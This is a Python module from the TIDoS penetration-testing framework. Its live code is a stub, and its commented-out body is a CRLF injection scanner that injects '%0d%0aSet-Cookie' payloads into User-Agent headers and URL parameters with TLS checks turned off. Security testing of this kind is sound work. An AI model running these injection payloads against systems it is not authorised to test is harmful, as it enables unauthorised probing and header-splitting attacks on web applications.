#!/usr/bin/env python
from core.colors import color
def crlf(target):
    print('This module is not yet available.')
    pass
# #!/usr/bin/env python
# # -*- coding: utf-8 -*-

# #-:-:-:-:-:-:-:-:-:-:-:-:#
# #    TIDoS Framework     #
# #-:-:-:-:-:-:-:-:-:-:-:-:#

# #Author: @_tID_
# #This module requires TIDoS Framework
# #https://github.com/0xInfection/TIDoS-Framework

# from __future__ import print_function
# import os
# import sys
# import urllib2
# import urllib3
# import requests
# import time
# from core.Core.colors import *
# from requests.packages.urllib3.exceptions import InsecureRequestWarning
# requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# payloads = []

# def check0x00(headers, pay):

#     vuln = False
#     try:
#         print(O+' [!] Headers obtained...')
#         time.sleep(0.6)
#         print(GR+' [*] Initiating response check...')
#         for head in headers:

#             if 'Set-Cookie'.lower() in head.lower():
#                 print(G+' [+] Found Cookie Reflection Value...')
#                 time.sleep(0.5)
#                 print(O+' [*] Checking cookie response...')
#                 time.sleep(0.8)
#                 if headers['Set-Cookie'].lower() == 'Infected_by=Drake'.lower():
#                     vuln = True
#                 else:
#                     vuln = False

#         if vuln == True:
#             print(G+' [+] CRLF Injection Successful!')
#             print(O+' [+] Found Cookie Response Reflection : '+C+'Infected_by=Drake\n')
#         elif vuln == False:
#             print(R+' [-] Payload '+O+pay+R+' unsuccessful!')
#             print(R+' [-] No Response Header Splitting...\n')
#         else:
#             print(R+' [-] Fuck! Something really went bad...')

#     except Exception as e:
#         print(R+' [-] Exception encountered!')
#         print(R+' [-] Error : '+str(e))

# def getHeaders0x00(web0x00, headers):

#     try:
#         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
#         print(GR+' [*] Requesting headers...')
#         r = requests.get(web0x00, headers=headers, timeout=7, verify=False)
#         head = r.headers
#         return head
#     except Exception as e:
#         print(R+' [-] Unexpected Exception Encountered!')
#         print(R+' [-] Exception : '+str(e))

# def getFile0x00():

#     try:
#         print(GR+' [*] Importing filepath...')
#         print(O+' [#] Enter path to file (default: files/payload-db/crlf_payloads.lst)...')
#         w = raw_input(O+' [#] Your input (Press Enter if default) :> ')
#         if w == '':
#             fi = 'files/payload-db/crlf_payloads.lst'
#             print(GR+' [*] Importing payloads...')
#             with open(fi, 'r') as q0:
#                 for q in q0:
#                     q = q.strip('\n')
#                     payloads.append(q)

#         else:
#             fi = w
#             if os.path.exists(fi):
#                 print(G+' [+] File '+fi+' found...')
#                 print(GR+' [*] Importing payloads...')
#                 with open(fi, 'r') as q0:
#                     for q in q0:
#                         q = q.strip('\n')
#                         payloads.append(q)
#         return payloads

#     except IOError:
#         print(R+' [-] File path '+O+fi+' not found!')

# def crlf(web):

#     print(GR+' [*] Loading module...')
#     time.sleep(0.5)
#     print(R+'\n    =============================')
#     print(R+'     C R L F   I N J E C T I O N')
#     print(R+'    =============================\n')

#     gen_headers =    {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
#                       'Accept-Language':'en-US;',
#                       'Accept-Encoding': 'gzip, deflate',
#                       'Accept': 'text/html,application/xhtml+xml,application/xml;',
#                       'Connection':'close'}
#     inf_headers =    {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201%0d%0aSet-Cookie: Infected_by=Drake',
#                       'Accept-Language':'en-US;',
#                       'Accept-Encoding': 'gzip, deflate',
#                       'Accept': 'text/html,application/xhtml+xml,application/xml;',
#                       'Connection':'close'}
#     print(GR+' [*] Testing response to normal requests...')
#     time.sleep(0.5)
#     print(O+' [*] Setting header values...')
#     time.sleep(0.7)
#     req = urllib2.Request(web)
#     req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201')
#     req.add_header('Accept-Language', 'en-US;')
#     req.add_header('Accept-Encoding', 'gzip, deflate')
#     req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;')
#     req.add_header('Connection', 'close')
#     response = urllib2.urlopen(req)

#     print(O+' [+] Response headers obtained!\n'+C)
#     time.sleep(1)
#     print(response.info())

#     time.sleep(0.8)
#     print(O+' [*] Initiating '+R+'User-Agent Based Check...')
#     time.sleep(0.5)
#     print(B+' [+] Injecting CRLF in User-Agent Based value : '+C+'%0d%0a ...')
#     time.sleep(0.7)

#     print(O+' [*] Using !nfected UA Value : '+inf_headers['User-Agent'])
#     m = getHeaders0x00(web, inf_headers)
#     check0x00(m, 'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201%0d%0aSet-Cookie: Infected_by=Drake')
#     print(GR+' [*] Initiating '+R+'Parameter Based Check...')
#     param = raw_input(O+' [#] Scope parameter (eg. /vuln/page.php?crlf=x) :> ')
#     if not param.startswith('/'):
#         param = '/' + param
#     e = getFile0x00()
#     web0 = web + param
#     web00 = web0.split('=')[0] + '='
#     try:
#         for pay in payloads:
#             web0x00 = web00 + pay
#             print(C+' [+] Using payload : '+B+str(pay))
#             print(B+' [+] Using !nfected Url : '+GR+str(web0x00))
#             p = getHeaders0x00(web0x00, gen_headers)
#             check0x00(p, pay)
#     except Exception as e:
#         print(R+' [-] Unexpected Exception Encountered!')
#         print(R+' [-] Exception : '+str(e))
#     print(G+' [+] CRLF Module Completed!')
